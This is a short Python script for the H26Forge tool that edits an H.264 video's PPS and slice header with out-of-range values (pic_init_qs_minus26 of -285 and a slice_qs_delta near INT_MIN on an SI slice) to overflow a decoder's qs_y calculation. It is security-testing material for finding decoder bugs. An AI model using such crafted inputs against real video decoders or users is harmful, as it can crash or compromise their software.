##
# Overflows a qs_y calculation, triggering potential issues while decoding
#
# Run with `./h26forge modify -i input_vids/SPS_PPS_I_P.264 -o overflowing_qs_y.264 -t overflowing_qs_y.py`
#
def overflow_qs_y(ds):

    ds["ppses"][0]["pic_init_qs_minus26"] = -285
    # SI slice
    ds["slices"][0]["sh"]["slice_type"] = 4
    ds["slices"][0]["sh"]["slice_qs_delta"] = -2147483645
   
    return ds

def modify_video(ds):
    return overflow_qs_y(ds)